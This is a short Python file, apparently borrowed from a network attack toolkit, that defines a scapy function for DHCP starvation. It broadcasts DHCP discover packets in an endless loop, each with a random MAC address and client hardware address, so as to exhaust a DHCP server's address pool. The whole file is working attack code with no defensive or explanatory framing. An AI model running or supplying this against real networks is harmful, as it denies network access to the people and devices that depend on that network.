from scapy.all import *

'''THIS CODE IS NOT MINE! It has been borrowed from the "Zarp" program'''

def DHCPstarvation(terminal=None):
    try:
        if terminal == None:
            print('[+] Starving network of DHCP resources')
        else:
            terminal.write('\n[+] Starving network of DHCP resources')
        while True:
            pkt = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")
            pkt /= IP(src="0.0.0.0", dst="255.255.255.255")
            pkt /= UDP(sport=68, dport=67)
            pkt /= BOOTP(chaddr=''.join(random.choice('abcdef1234567890') for _ in range(12)))
            pkt /= DHCP(options=[("message-type", 'discover'), 'end'])
            sendp(pkt,verbose=0)
    except Exception as s:
        if terminal == None:
            print(s)
        else:
            terminal.write('\n'+str(s))
